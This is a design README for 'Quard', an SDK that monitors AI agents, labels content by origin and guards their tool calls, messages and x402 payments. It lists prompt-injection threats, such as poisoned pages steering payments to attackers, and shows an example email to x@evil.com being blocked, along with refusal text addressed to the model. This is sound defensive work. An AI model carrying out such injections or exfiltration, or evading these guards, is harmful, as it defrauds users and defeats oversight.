# Quard

Quard watches AI agents while they work. It records every model call, stops dangerous actions before they run, and shows which step and which agent caused a failure.

Every piece of content gets a label that says where it came from. Guards use the labels live. The dashboard uses them afterwards. Quard works for one agent and for agents that delegate to, message and share memory with each other.

**About this file**

- Product spec: [Agent monitor, SDK and guards](https://claude.ai/artifact/GA9gWjEHoHnuzDGVdLBx43). It has three tabs: the spec, "Guards in depth" and "Open questions".
- Q1 to Q27 are the questions in the spec's "Open questions" tab. The [Decision record](#decision-record) lists each answer and who decided it.
- This file records the decisions made on 2026-10-03. Where it disagrees with the spec, this file wins. Past changes to the spec are listed in [Changes to the spec](#changes-to-the-spec).
- Decisions marked **Claude's pick** were chosen by Claude after the owner said "go with your own picks". Review those first.
- Build order: [ROADMAP.md](ROADMAP.md).
- Coding rules: [AGENTS.md](AGENTS.md). Dashboard look and feel: [web/DESIGN.md](web/DESIGN.md).

## Contents

1. [What v1 includes](#what-v1-includes)
2. [Repo layout](#repo-layout)
3. [Tech stack](#tech-stack)
4. [SDK](#sdk)
5. [Guards](#guards)
6. [Approvals](#approvals)
7. [Multi-agent](#multi-agent)
8. [Payments (x402)](#payments-x402)
9. [Root-cause finder](#root-cause-finder)
10. [AI inside Quard](#ai-inside-quard)
11. [Data, storage and hosting](#data-storage-and-hosting)
12. [Services](#services)
13. [Dashboard](#dashboard)
14. [Decision record](#decision-record)
15. [Changes to the spec](#changes-to-the-spec)
16. [Open items](#open-items)

## What v1 includes

In v1:

- A TypeScript SDK for the OpenAI Responses API.
- `monitor`, which wraps the OpenAI client, and `guard()`, which wraps tools, with all six guard types.
- Guards and records for the payments agents make over x402.
- Labels, value matching, run limits and the fleet check.
- Approvals on a dashboard page.
- The root-cause finder, with replay and an AI-written explanation.
- Multi-agent runs: run context, labeled messages across processes and a generic shared-memory wrapper.
- An integration for the OpenAI Agents SDK (JS).
- Content labels: the Jev detector labels public content from a fixed list, an AI labels what fits none, and a review queue tunes them. Jev acts by default, and a team can switch it to observe.
- A self-hosted install with Docker and Postgres.

Later:

- Anthropic Messages, Chat Completions and a Python SDK.
- Approvals in Slack, email or the app's own UI.
- Rules edited in the dashboard.
- Near-match and paraphrase matching.
- Integrations for the Vercel AI SDK, Mastra, LangGraph and others.
- Native adapters for pgvector, Pinecone, Chroma and other stores.
- Other detectors, and labels a team defines.
- A hosted service, single sign-on and OpenTelemetry export.

## Repo layout

```text
.
├── db/
│   └── migrations/   # Postgres schema changes, plain SQL, run in order
├── docs/             # documentation site (Nextra)
├── packages/
│   ├── shared/       # code the SDK and the services must share
│   └── sdk/          # the Quard SDK, published as "quard"
│       └── guards/   # one folder per guard type
├── services/
│   ├── webhook/      # receives SDK events; public, agent keys only
│   ├── control/      # SDK connect, rules, counters, approvals, revocation; public, agent keys only
│   └── worker/       # background jobs from the queue; no endpoint
├── web/              # dashboard (Next.js)
├── AGENTS.md
└── PROJECT.md
```

All of these exist, plus `sandbox/` with runnable SDK examples. `services/worker` runs no jobs yet.

How the parts talk:

```text
Your app + Quard SDK
    ├── events, in batches ───────────► services/webhook ──┐
    └── connect, counters, approvals ─► services/control ──┤
                                                            ▼
web (dashboard) ◄────────────────────────────────────► Postgres ◄──► services/worker
people sign in and approve here                     data + job queue
```

### packages/shared

Code that must behave the same in the SDK and on the server:

- event and API schemas (Zod)
- label types: origin, trust, sensitivity
- value normalizers: IBAN, email, URL, domain, file path
- the keyed hash for sensitive values, and each project's hash key, made from the install's key
- refusal text templates

The SDK bundles this package, so it must not hold database or server code.

### packages/sdk

What teams install. Suggested folders inside it (**Claude's pick**):

```text
packages/sdk/
├── monitor/        # wrapped client, request and response checks
├── context/        # run context: run, agent, parent step
├── labels/         # label engine, content index, value matching
├── pipeline/       # the nine-step guard pipeline
├── guards/         # source, action, approval, egress, limit
├── detectors/      # detector interface, jev/
├── memory/         # shared-memory wrapper
├── integrations/   # openai-agents/
└── transport/      # link to control, uploads to webhook
```

## Tech stack

All **Claude's pick**, except the parts already set up in `web/`.

- TypeScript everywhere, in one pnpm workspace at the repo root.
- Prettier with 4 spaces and a print width of 120, set in the root `.prettierrc`.
- Node 24 LTS for the services. The SDK supports Node 22.12 and later and ships as ESM.
- TypeScript 5.9 or 6.x, pinned in each package.json, because npm's `latest` tag is now 7.0. Not 7.0 yet: it has no programmatic API, and typescript-eslint needs one.
- Hono for `webhook` and `control`.
- Postgres 18 as the only database. Plain SQL migrations in `db/migrations`. Kysely for typed queries.
- The job queue is a Postgres table on the same Postgres, with no queue library. See [Services](#services).
- Zod for schemas, shared through `packages/shared`.
- Vitest for tests. Coverage must be 100% for lines, branches, functions and statements in every package, every service and `web/`. CI fails below that.
- tsdown to build the SDK.
- The dashboard already uses Next.js 16.3.8, React 19.2.8, Tailwind CSS 4 and shadcn.
- IDs use the W3C trace format: a 32-hex run id and a 16-hex step id. This keeps OpenTelemetry export open for later.

## SDK

### Setup

```ts
import OpenAI from "openai";
import { quard, guard } from "quard";

quard.configure({
    key: process.env.QUARD_AGENT_KEY,
    webhookUrl: process.env.QUARD_WEBHOOK_URL,
    controlUrl: process.env.QUARD_CONTROL_URL,
});

const client = quard.wrap(new OpenAI());

const fetchPage = guard(rawFetchPage, { type: "source", origin: "web", name: "fetchPage" });
const sendEmail = guard(rawSendEmail, [{ type: "egress", name: "sendEmail" }, { type: "limit" }]);
const payInvoice = guard(rawPayInvoice, { type: "approval", name: "payInvoice" });

await quard.run({ agent: "billing" }, async () => {
    const res = await client.responses.create({ model, input, tools });
    // run the model's tool calls through the guarded functions
});
```

Developers use two names: the `quard` object and `guard()`. Inside Quard, the part that watches model calls is called the monitor.

### How monitor sees model calls

Decided by Q1, Q2 and Q3.

- `quard.wrap(client)` installs the monitor as the client's `fetch`. Every request, stream and endpoint passes through the monitor before the app sees the result.
- v1 supports the OpenAI Responses API in TypeScript. Keep the internal event format provider-neutral, so Anthropic and Python become adapters, not rewrites.
- A Responses result does not include its input, so monitor reads the request itself. This also works with `store: false` and zero data retention.
- Input items get labels by matching their content against labeled content the run already holds, not by their role. A brief from another agent that arrives as a "user" message keeps its web label.
- A request chained to an earlier response, through `previous_response_id` or `conversation`, joins that run and reuses its labels. The SDK takes them from its own in-process copy, or else asks `control`. History Quard never saw counts as untrusted.
- In a stream, monitor passes events through as they arrive. Only the event that completes a tool call is held until that call passes its checks.

Rules for hosted tools use the name the model uses: `web_search`, or the hosted MCP tool's name. They come from the policy file's `guards`, else from `hostedTools` in `quard.configure()`. (**Claude's pick**)

**Hosted web search** (Q3)

- Allowed. monitor adds `"web_search_call.action.sources"` to the request's `include` list and keeps any values already there. This only adds the source list to the response.
- An enforced `source` rule's `allowDomains` becomes the tool's `allowed_domains` filter, narrowing any filter the app set. The API has no block filter, so `blockDomains` is only checked afterwards. (**Claude's pick**)
- monitor records each site the search opened, listed or cited as `web:<domain>` content, checks those domains against the block and allow lists, and marks the response web-influenced. A blocked site can't be stopped, so its content is flagged `blocked_domain`. The queries are not recorded yet.
- The page text never reaches Quard, so the scan is recorded as `unscanned`, not `pass`.
- Values copied from those pages are found nowhere in the run, so they count as model-generated.
- Teams that need page scanning and exact value tracing run search as their own tool, wrapped with a `source` guard.

**Hosted MCP**

- The Responses API can ask for approval before a hosted MCP tool runs. monitor answers these requests with `action` and `approval` rules.
- This only works while approval stays on for that tool, so monitor sets `require_approval: "always"` on every hosted MCP server in the request. (**Claude's pick**)
- monitor never sends the follow-up request. `quard.mcpApprovals(response)` checks each approval request like a guarded call (permission, `limit`, `action`, `egress`, `approval`) and returns the `mcp_approval_response` items for the app's next request. Blocked calls, and requests monitor never saw, are refused with the refusal text as the reason. Asks wait for a human. Each request is decided once. (**Claude's pick**)
- What a hosted MCP tool returned is labeled `mcp:<server label>` and flagged `unscanned`.

### Run context

Decided by the spec (Guards in depth, step 1).

- `guard()` and `monitor` read the run, agent and parent step from the current run context. In Node this is AsyncLocalStorage.
- `quard.run()` starts a run. `quard.agent()` starts a child agent inside it. Everything inside inherits the tags, even across `await`.
- The OpenAI Agents SDK integration takes the current agent from the framework. Handoffs and agents-as-tools switch agents inside one `run()` call, so app code can't set it.
- A call outside any scope joins the run of the response it chains to. Otherwise it starts a new run under the agent `"default"`, which holds every guarded tool. So single-agent apps need no scopes. (**Claude's pick**)

```ts
await quard.run({ agent: "orchestrator" }, async () => {
    const plan = await client.responses.create({ model, input });

    await quard.agent("researcher", async () => {
        await client.responses.create({ model, input: plan.output_text });
        // tagged: same run, agent "researcher", parent step
        await fetchPage(url);
    });
});
```

## Guards

### The pipeline

Every guarded call runs the same nine steps, from Guards in depth:

1. **Context.** Read the run, agent and parent step from the run context.
2. **Permission.** Check that this agent may use this tool in this run. A delegated agent only holds what its parent granted.
3. **Labels.** Label the call and each argument.
4. **Checks.** Run the guards that act before the call: `limit`, `action`, `egress` and `approval`.
5. **Decision.** The strictest result wins: block, then ask, then allow. A blocked call never reaches the tool.
6. **Approval.** On ask, a human sees the arguments, their origins and the path that led there, and approves those exact arguments.
7. **Run.** The tool runs with exactly the checked arguments. Its start, end, result or error are recorded.
8. **Output.** For `source` tools, the output is labeled, scanned and added to the run's content index before the agent sees it.
9. **Record.** Every decision, with its rule and reason, goes to the backend, allows included.

Block checks run again right after an approval. So an approval never overrides a block that came up while waiting, such as a daily cap. (**Claude's pick**)

### Labels

Decided by the spec, Q5 and Q22.

A label has three parts:

- **origin**: which tool, domain, sender, server or agent let the content in
- **trust**: trusted or untrusted
- **sensitivity**: internal or public

Origin comes from the wrapper that let the content in. It never comes from the content itself or from an AI. Trust and sensitivity follow from origin through a mapping.

**Default mapping** (Q5)

| Origin | Trust | Sensitivity |
| --- | --- | --- |
| The user | trusted | internal |
| Your own tools, wrapped with `guard()` but not as `source` | trusted | internal |
| Web pages, hosted web search | untrusted | public |
| Email (inbox tools), colleagues' mail included | untrusted | public |
| MCP servers | untrusted | public |
| Files from `source` tools | untrusted | internal |
| Another agent | the labels of its content | the labels of its content |
| Unknown: unwrapped tools, unlabeled memory, unmonitored channels | untrusted | internal |

The rows for email, files and unknown content are **Claude's pick**.

Teams change one origin at a time, in code or in the policy file. Every override is recorded in the run. Apps open to the public can mark the user as untrusted.

```ts
quard.configure({
    origins: {
        // our own MCP server holds CRM data
        "mcp:crm.acme.internal": { trust: "trusted", sensitivity: "internal" },
    },
});
```

**Context label.** Each call gets the least trusted and most sensitive label among everything the model read before it asked for the call. If that label is untrusted, the call is marked **influenced**. An agent that browses is almost always influenced, so rules for sensitive actions should use value labels.

**Value labels** (Q22). For each argument, Quard lists every place the value appeared earlier in the run.

- Values are compared after normalizing case, spaces and URL form.
- The search covers the whole run's content index, across all agents.
- It also finds a known value inside a longer argument, like a URL or an IBAN inside an email body.
- Typed values always count: IBAN, email, URL or domain, and file path.
- URLs and emails also match by host and by main domain, such as `acme.co.uk` for `mail.acme.co.uk`. The Public Suffix List decides the main domain.
- Other values count only when they look like IDs: 8 or more characters, no spaces, at least one digit, matched on word boundaries.
- Words, phrases, dates and amounts are not traced on their own. The call is still marked influenced.
- A value found nowhere is **model-generated**. Rules can treat it as untrusted for sensitive fields like an IBAN.
- A value a model wrote stays model-generated for the rest of the run once Quard has seen it pass through another agent's message or a memory item that no record vouched for. Later trusted tool output, and even the user's or the system's words, don't make it seen; only a record can. (**Claude's pick**)
- No near-match or paraphrase matching in v1. The root-cause finder can add them later, offline.

### Guard types

From the spec:

| Type | Wrap it around | What it checks | Outcome |
| --- | --- | --- | --- |
| `source` | Tools that bring outside content in: web fetch, search, inbox, files, MCP | Labels the output with its origin; scans for bad domains, hidden instructions and invisible text | Pass, strip, flag or block |
| `action` | Tools that change something: payments, emails, deletes, deploys | Rules on arguments and their labels, such as an IBAN only from supplier records | Allow, block or ask a human |
| `approval` | High-stakes tools | Always asks a human before running | Run or block |
| `egress` | Tools that send data out: email, HTTP posts, uploads | Internal data headed to a destination outside an allowlist or found in untrusted content | Allow, block or ask a human |
| `limit` | Any tool | Calls and amounts per run, agent or day, and a new value suddenly used by many agents | Allow or block |
| `x402` | An x402 payment client | Payment amounts per payment, run and day, paid hosts, payees first seen in untrusted content, and new payees used by many runs. Added by the **Owner**; see [Payments (x402)](#payments-x402) | Allow, block, or ask a human above a set amount |

- **source** runs after the tool returns. It records the exact origin: URL, sender, server or file. It checks the domain against block and allow lists. It scans for instructions aimed at an AI, text shaped like a tool call, and invisible text. Then it passes the content, strips suspect parts, flags it so later actions face stricter rules, or blocks it. Jev labels the content here too.
- **action** runs before the call. Typical rules: a value must come from a named origin, like an IBAN from supplier records. Amounts are capped. Never-seen recipients go to a human.
- **approval** always asks first. See [Approvals](#approvals).
- **egress** finds the destination (recipients, host or upload target) and the payload's sensitivity from its value labels and context label. Internal data may only go to allowlisted destinations. It never goes to a destination that first appeared in untrusted content.
- **limit** keeps counters per tool, keyed by run, agent, day and value. It caps calls, amounts and cost, catches delegation loops and fan-out, and runs the fleet check.

**Fleet check** (Q9)

- The check watches recipients, IBANs and domains first seen in the fleet less than 7 days ago. Once a 5th separate run uses one within 24 hours, it is blocked everywhere.
- Teams name the fields to watch on a `limit` guard, such as `fleetCheck: ["iban"]`. Blocked attempts count too.
- A blocked value goes on the quarantine list. It stays there until someone marks it known in the dashboard.
- For its first 7 days, the check runs in observe mode, because it has no history yet.

**Per-day limits** (`maxCallsPerDay`, `maxAmountPerDay`) count every agent's calls to the tool across the project, per UTC day. `control` keeps the count, so every process shares it. One call's per-day counts are added all or none, and a call refused after it was counted gives them back. Another process that saw those counts before they were given back may keep them in its local count until the next UTC day. (**Claude's pick**)

### Guards inside monitor

monitor applies the same checks to what never passes through `guard()`, from Guards in depth:

- Requested tool calls are checked against the agent's permissions and labels before the app receives them.
- A requested tool call that fails this check stays in the response, marked blocked. When the app runs it through its guarded function, the guard returns the refusal at once and the tool never runs. A tool that isn't wrapped with `guard()` can only be recorded, so Quard warns about it.
- In a stream, the event that completes a tool call is held until that check passes.
- Hosted MCP approval requests are answered by `action` and `approval` rules.
- Hosted web search marks the response web-influenced and checks the consulted domains.

### Rules and rollout

Decided by Q6 and Q7.

- Rules live in code, in `guard()` options, and optionally in one JSON policy file set with `quard.configure({ policyFile })`. Code rules change through pull requests and roll back with a redeploy. Operators can edit the policy file while agents run: a tool listed there uses the file's options instead of its code options, from its next call on. (**Owner**)
- A policy file or signature feed that fails to load leaves the last good one in use. The SDK records a config error, which `webhook` stores and the overview shows. (**Claude's pick**)
- Each guard needs `name`: the tool name the model sees. `guard()` throws without it, because a function's own name can differ (`rawFetchPage`) or be lost to minifiers. The dashboard uses it to keep a rule's history across deploys and to link the model's tool call to the matching guarded call.
- On connect, and again whenever they change, the SDK sends its active rules, as names and a hash, to `control`. Every decision records that hash. The dashboard shows which rules ran but does not edit them.
- Rules a team writes **block by default**. `mode: "observe"` records "would block" or "would ask" and lets the call run. Observe rules never change the final decision.
- Approval guards have no mode. They always ask.
- Defaults the product sets start in observe mode: the run limits and the fleet check's first 7 days. The Jev detector is the exception: it acts by default, and a team can switch it to observe. (**Owner**)
- Switching a rule's mode is a code change and a redeploy, or an edit to the policy file.

```ts
// Enforces at once (default mode: "block")
const sendEmail = guard(rawSendEmail, { type: "egress", name: "sendEmail", allow: ["*.acme.com"] });

// Try a new rule on live traffic first
const payInvoice = guard(rawPayInvoice, {
    type: "limit",
    name: "payInvoice",
    maxAmountPerDay: { field: "amount", max: 50000 },
    mode: "observe",
});
```

### When a guard blocks

Decided by Q20.

- A blocked or denied call returns a **refusal** that the model reads as the tool result. It says what was stopped, why, and not to retry.
- Refusal text comes from fixed templates. It never quotes untrusted content.
- `isGuardRefusal(result)` lets code check for one.
- `onBlock: "throw"` makes a guard throw `GuardBlockedError { guard, reason, refusal }` instead.
- A refusal has `toString()` and `toJSON()`, so it works in a plain Responses loop and in frameworks.
- `guard()` turns only its own decisions into refusals. Errors thrown by the tool are recorded and re-thrown unchanged. Errors that a framework throws on purpose, for example to pause a run, pass through unchanged.

```ts
const out = await sendEmail({ to: "x@evil.com", subject, body });
// rawSendEmail did not run. The model reads:
// "Blocked by egress guard: x@evil.com first appeared
//  in web content. The email was NOT sent. Do not retry."
if (isGuardRefusal(out)) console.warn(out.guard, out.reason);
```

### When the backend is down

Decided by Q23.

| Part | While the backend is unreachable |
| --- | --- |
| Rules, value labels, per-run limits, scans | Run as usual, in-process |
| Approvals and any "ask" | Block after retrying for up to 30 s, reason `backend_unavailable` |
| Per-day limits | Count locally and block once the local count reaches the cap |
| Fleet check and quarantine lists | Use the last synced copy, up to 24 h old |
| Label lookups | A label that can't be looked up counts as untrusted |
| Jev detector | Keeps working: the SDK calls Jev directly, not through the backend |
| Decision records | Buffered, up to 10,000, and retried every 1 s to 60 s |
| Uploads and label records, before the SDK has its project's hash key | Events wait in the upload buffer. Label records wait up to 5 s, then are not stored. No raw value leaves the process |

If the buffer fills, the oldest allow records are dropped first, and the number lost is recorded. `webhook` stores it, and the overview shows how many events were lost in the last 24 hours. Records sent late carry `degraded: true`.

## Approvals

Decided by Q8, Q21 and Q24.

- **Where.** On a dashboard page in v1. The approver signs in and sees the arguments, each value's origin and the influence path.
- **Waiting.** `guard()` pauses the call until someone answers. Then it runs the tool with exactly the approved arguments, or returns a refusal. This works in any agent loop.
- **No time limit.** A request waits until someone answers, and an approval never expires. It is void if any argument changes.
- **Three answers:**
    - **Approve once.** Runs this call, with these exact arguments, one time.
    - **Always approve.** Later calls pass without asking if they come from the same agent and use the same tool with exactly the same arguments. This holds in any run until someone revokes it in the dashboard. Any changed argument asks again.
    - **Deny.** The call returns a refusal.
- An approval is stored with a hash of the normalized arguments. "Approve once" is bound to the run, agent, step and tool. "Always approve" is bound to the agent, tool and argument hash.
- While a request is open, a new identical call (same agent, tool and arguments) waits on the same request instead of opening another. (**Claude's pick**)
- A waiting process can stop, for example after a crash or a host time limit. Its heartbeats then stop, and the dashboard shows the request as "no longer waiting". The request stays open. An "approve once" given then is used by the next identical call. (**Claude's pick**)
- Some hosts stop a waiting call. Vercel Functions and Cloud Run stop after 5 minutes by default. Vercel allows up to 800 seconds on Pro and Enterprise and 5 minutes on Hobby; Cloud Run allows up to 60 minutes. Teams there should raise the limit where they can, or set the optional `timeout`, in seconds, on the approval guard. There is no timeout by default. (**Claude's pick**)
- Action and egress guards take the same optional `timeout` for their asks. When several guards ask, the call waits at most the shortest timeout among them. (**Claude's pick, owner asked**)
- The approver must see real values, so an open request keeps the full arguments. After the decision only the hash and the masked arguments are kept. See [Redaction](#redaction).

```ts
const payInvoice = guard(rawPayInvoice, { type: "approval", name: "payInvoice" });

// waits here until someone answers
const out = await payInvoice({ iban, amount: 4950 });
// approve once or always: rawPayInvoice runs with these args
// deny: out is a refusal the model reads
```

## Multi-agent

Decided by the spec and Q11 to Q15.

- **One run.** Every agent's calls land in one run. They form a run graph: the orchestrator at the root, delegated agents as children, and messages and handoffs as edges in time order.
- **Agent versions.** Each agent's model, instructions and tools are recorded once per version, so an incident ties to the version that caused it.
- **Permissions.** An agent holds its own tools, narrowed by what its parent delegated. Delegation can only narrow.
- **Sending** (Q12). Wrap each send or delegate function with `guard()`, like any tool. It checks permissions and the limits on depth, loops and fan-out. Then it writes the run id, the parent step id and a label reference into the message.
- **Receiving** (spec). A receive function wrapped with a `source` guard labels incoming messages with the sender and the labels the sender attached.
- **Across processes** (Q11). Only three things travel: the run id, the parent step id and a label reference.
    - They ride in the slot each channel already has: W3C baggage on HTTP, `_meta` on MCP, `metadata` on A2A, attributes on queue messages.
    - The sender stores the label record, with a hash of the content, before the message leaves.
    - The receiver looks the labels up through `control`.
    - `await quard.inject({ content })` stores the label record, then returns the three items for the channel's slot. On the receiving side, `await quard.resume(carrier, fn)` looks the record up once and runs `fn` inside that run. Both return promises. (**Claude's pick**)
    - On HTTP the three items ride in a W3C `baggage` header as `quard-run`, `quard-parent` and `quard-labels`. `quard.toBaggage(carrier)` writes the header, and `quard.resume()` also accepts the header text. (**Claude's pick**)
    - Values leave the process only as keyed hashes. The receiver hashes the values it finds in the message and takes each match's label from the record. A record vouches for a message only when the run and the content's hash both match. (**Claude's pick**)
    - The content's hash is keyed with the project's hash key and covers the exact content: every character, every field and which value belongs to which key. (**Claude's pick**)
    - A missing, unreadable or mismatched reference counts as untrusted. So does a record that could not be stored or looked up. Value tracing reconnects the pieces later.
    - The receiving agent gets no more tools than the sender had, and its depth continues from the sender's. When the record is missing, Quard records a warning and counts the agent as past the depth limit, so it can't delegate further once depth limits are on.
    - A sender run that has read nothing vouches for nothing: its message counts as unknown content, untrusted and internal. The same goes for a memory write.
- **Across agents.** Value labels search the whole run's content index, so an IBAN from one agent's web page is caught in another agent's payment.
- **Shared memory** (Q14). A generic wrapper goes around the app's memory read and write functions, or around any store with get, put and search.
    - `quard.memory(store, { name })` returns the store with the same shape. Reads are `get`, `search` and `read`; writes are `put` and `write`. Items read get the origin `memory:<name>`. (**Claude's pick**)
    - A write stores the item's labels before the inner write runs. Labels for the same content merge to the least trusted and most sensitive, so writing it again never makes it more trusted. The backend keeps one merged label per item.
    - An item changed outside the wrapper, even by one hidden character, fails the hash check and reads back as untrusted. Items must be read back in the shape they were written.
    - Labels live in the backend, keyed by a hash of the content. They come back on read, even in a later run.
    - Content changed outside the wrapper fails the hash check and reads back as untrusted.
    - Memory labels are not deleted with runs.
- **Frameworks** (Q13). The OpenAI Agents SDK (JS) comes first. Its integration uses the wrapped OpenAI client, takes the current agent from the framework, and tags handoffs and agents-as-tools. Where it must stop something, it uses the SDK's tool guardrails and approval flow.
    - It ships as `quard/openai-agents`, so the core package does not need the Agents SDK. `quardRunner({ client })` returns a `Runner` whose runs land in one Quard run. `guardedTool({ ...toolOptions, guard })` runs every call of a tool through `guard()`. (**Claude's pick**)
    - A block becomes a tool guardrail rejection that the model reads. With `onBlock: "throw"` the run stops with `GuardBlockedError`. An approval still pauses inside the tool call, as everywhere else (Q21). (**Claude's pick**)
    - A handoff passes control on, so the depth stays the same. An agent run as a tool adds a level, and its input is the caller's brief, labeled `agent:<caller>`. A run paused for the SDK's own approval resumes into the same Quard run, with its labels. (**Claude's pick**)

```ts
// Sending: a guarded tool like any other. delegateTo names the receiver.
const delegate = guard(
    async ({ to, brief }) => send(to, brief, { baggage: quard.toBaggage(await quard.inject({ content: brief })) }),
    { type: "limit", name: "delegate", delegateTo: "to" },
);

// Receiving, in another process
const receive = guard(rawReceive, { type: "source", origin: "agent", name: "receive" });
await quard.resume(request.headers.baggage, () => billingAgent(receive), { agent: "billing" });
```

**Run limits** (Q15, **Claude's pick**: Balanced)

| Limit | Default per run |
| --- | --- |
| Delegation depth | 3 levels |
| Fan-out | 10 helpers per agent |
| Loops | 5 handoffs back and forth between the same two agents |
| Steps | 200 model calls across all agents |
| Cost | $5 |

- These are product defaults, so they start in observe mode. They record "would block" until a team switches them on.
- Teams set them with `runLimits` in `quard.configure()` or the policy file. The policy file wins field by field. The dashboard lists them with the other rules, for the whole run. (**Claude's pick**)
- Depth, fan-out and loops are checked on a limit guard with `delegateTo`, the argument that names the receiving agent. Steps and cost are checked before each model call; a refused call never leaves the process. (**Claude's pick**)
- Cost is estimated from token usage and a price table. When a price is unknown, the step limit still caps the run.
- When a run spans processes, its counters live in `control`. (**Claude's pick**)
    - Steps, cost and per-run tool counts move to `control` when a message first carries the run to another process. Until then they count in-process.
    - Fan-out and loops stay per process in v1, because they need more than a number.
    - One call's per-run counts are added all or none. If a per-day limit or the fleet check refuses the call afterwards, its per-run counts stay counted.

## Payments (x402)

Decided by the owner on 2026-10-04, except where marked.

[x402](https://docs.x402.org) lets an agent pay for an HTTP request on the spot:

1. The server answers `402` with a price in a base64 `PAYMENT-REQUIRED` header. Its `accepts` lists the payment options, each with `scheme`, `network`, `amount` (atomic units), `asset`, `payTo` and `maxTimeoutSeconds`.
2. The agent's wallet signs one option, and the request is sent again with a `PAYMENT-SIGNATURE` header.
3. The server settles, often through a facilitator, and answers with a `PAYMENT-RESPONSE` header (`success`, `transaction`, `network`, `payer`, `amount`).

v1 used `X-PAYMENT` and `X-PAYMENT-RESPONSE`, with requirements in the body. Quard reads both. The spec leaves budgets on the paying side out of scope. Quard covers them, against these risks:

- A poisoned page sends the agent to a paid endpoint, and the agent pays an attacker on every call.
- A server asks for more than a call is worth.
- A retry loop or many helpers pay the same endpoint hundreds of times.
- A new payee is suddenly paid by many runs.
- A payment settles, but the response is an error.

**The `x402` guard.** A sixth guard type wraps an x402 client, the way `guard()` wraps a tool: `quard.x402(client, options)`. It runs in the client's `onBeforePaymentCreation` hook, before the payment is signed. A blocked payment is never signed, and the model reads a refusal such as "Blocked by the x402 guard: the payment is over the run limit. The x402 payment did NOT happen. Do not retry it."

| Option | What it does |
| --- | --- |
| `maxPerPayment`, `maxPerRun`, `maxPerDay` | Set USD caps. The day total lives in `control` for the whole project, like per-day limits. |
| `maxPaymentsPerRun` | Caps how many payments one run makes, which catches loops. |
| `allowHosts`, `blockHosts` | List the hosts that may be paid and the hosts that never may. |
| `untrusted` | Applies to a host or payee first seen in untrusted content. `"block"` is the default; `"allow"` turns the check off. |
| `assetCaps` | Sets caps for tokens with no known USD value, in atomic units. |
| `fleetCheck` | Quarantines a payee that a 5th separate run pays within 24 h of first seeing it. |
| `approveAbove` | Asks a person above this many USD. It is off unless set. |
| `mode`, `onBlock` | Work as on every guard. |

```ts
const client = quard.x402(new x402Client(/* schemes, signer */), { type: "x402", maxPerRun: 2, maxPerDay: 20 });
const paidFetch = wrapFetchWithPayment(quard.x402Fetch(fetch), client);
```

- **Few human approvals.** The guard allows or blocks on its own, and asks a person only above `approveAbove`. Such an approval waits before signing, because a signed payment expires within `maxTimeoutSeconds`.
- **Defaults** (**Claude's pick**): $1 per payment, $5 per run, $50 per day, untrusted origins blocked, and the payee fleet check on. They start in observe mode like the other product defaults, and never ask a person. An option a team sets runs in the guard's mode, which is block unless set. (**Claude's pick**)
- **Untrusted payees.** A host or payee whose first appearance in the run was untrusted content is refused. A payee never seen in the run is allowed: the payee in a `402` is almost never in the content. (**Claude's pick**)
- **Counting.** Run and day totals are counted before signing, with the cap checked in the same step, so parallel payments can't race past it. (**Claude's pick**)
- **The refusal.** Inside a tool wrapped with `guard()`, the tool returns the refusal, like any guard. Outside one, the x402 client throws an error whose message is the refusal, for the app to pass on. (**Claude's pick**)
- **Every x402 response is recorded.** `quard.x402Fetch(fetch)` sits under the x402 client and records:
    - price requests, including the ones the guard refused;
    - signed payments;
    - settlements, with the transaction hash;
    - whether the paid response arrived. If it didn't, the payment is flagged "paid, not delivered".

  A signed payment that no `x402` guard checked is not sent, and Quard warns once, as it does for an unguarded tool. The paid fetch gets a `403` whose body the model reads. (**Claude's pick**)
- **Spend** counts settled payments only. A payment that settled but wasn't delivered still counts, because the money was spent. (**Claude's pick**)
- **The chain doesn't matter.** The network is recorded, but no rule depends on it. Any scheme and network the x402 client supports works.
- **No token is blocked for what it is.** USD caps apply where the value is known: stablecoins, from a small built-in list. Other tokens are recorded as "value unknown", and the count caps and `assetCaps` still apply.
- **Wallet addresses stay in clear,** since they are public on chain. They are still a value kind, so labels, search and the fleet check find them.
- **Records.** New `payment` events (`challenged`, `refused`, `signed`, `settled`, `failed`) carry the run, step, agent, host, resource URL (secrets removed), network, asset, amount, USD value when known, scheme and transaction hash. Runs get `spend_usd` next to `cost_usd`.
- **Dashboard.**
    - The run view shows payment steps with amount, host, payee, network and a transaction link.
    - The runs list and the overview show spend next to cost.
    - The Summary page shows spend by day, agent, host and payee, plus new and quarantined payees.
- **x402 over MCP.** A paid tool returns the `PaymentRequired` object as an error result, and the payment travels in `_meta["x402/payment"]`. Quard reads both through an MCP client wrapper, `quard.x402Mcp(client)`. (**Claude's pick**)
- **Tests never touch a real chain.** They use a local x402 server and a stub facilitator. The sandbox uses a test network.

## Root-cause finder

Decided by the spec, Q16 and Q17.

- Labels show at once whether untrusted content shaped a harmful action. Value tracing finds where each value in that action first appeared.
- The **verdict** names the entry point, the turning point, the damage and the missing guard. It is filed as bad input, bad reasoning, bad handoff, broken tool or missing guard.
- Across agents, the verdict names more. It names the entry agent and the handoff that carried the untrusted content. It also names the turning-point agent and the agent that did the damage.
- Bad handoffs are split into three kinds: wrong information sent, a constraint dropped in the message, or a correct message misread.
    - Untrusted content that another agent read and passed on stays bad input. The verdict names the handoff that carried it.
    - Wrong information sent: the damaging value first came in a message from another agent, or the message was not verified.
    - A correct message misread: the message was verified and trusted, and the damaging value is in none of the run's content.
    - A dropped constraint needs the message text, which Quard does not store, so the finder never names it. The AI note may point it out.
- The finder runs in `services/worker`.

### Incidents

Decided on 2026-10-04.

- Quard opens an incident for a run when a guard blocks a call, or when a guard detects something in content: the source scan (rule `source`), the AI detector (rule `detector:<name>`) or a signature flags or strips what a tool returned. Both count in enforce and observe mode. The detector also flags what it failed to check, so a detector flag whose reason holds `unchecked` but no risky label does not count. Neither does a source flag for an unknown host alone. Egress masking, allow, pass and ask never open one. A run has at most one incident, opened at its earliest such decision. `webhook` opens it in the same transaction that stores the decision. (**Owner**)
- When no tool call was blocked, the damage is the first tool call whose content a guard flagged, the entry point is that content and the category is bad input. With no flagged content either, a run limit that stopped a model call makes that model call the damage. Replay is limited for both, since there is no harmful call to test. The finder waits for the run to end, at most 5 minutes, before it takes either, so a call blocked later still wins. (**Claude's pick**)
- The verdict and the AI reviewer's note run on their own when an incident opens. Replay runs only when someone clicks the replay button on the incident page. (**Owner**)
- When the damaging call's events have not arrived yet, the finder tries again every 5 s. After 5 minutes it stops and says the events never arrived.

### Replay

Q16, **Claude's pick**. Replay tests the suspect content by rerunning the turning-point model call, with the earlier steps fixed.

- It runs in rounds of 5 with the suspect content and 5 without, up to 20 each.
- It stops as soon as the result is clear:
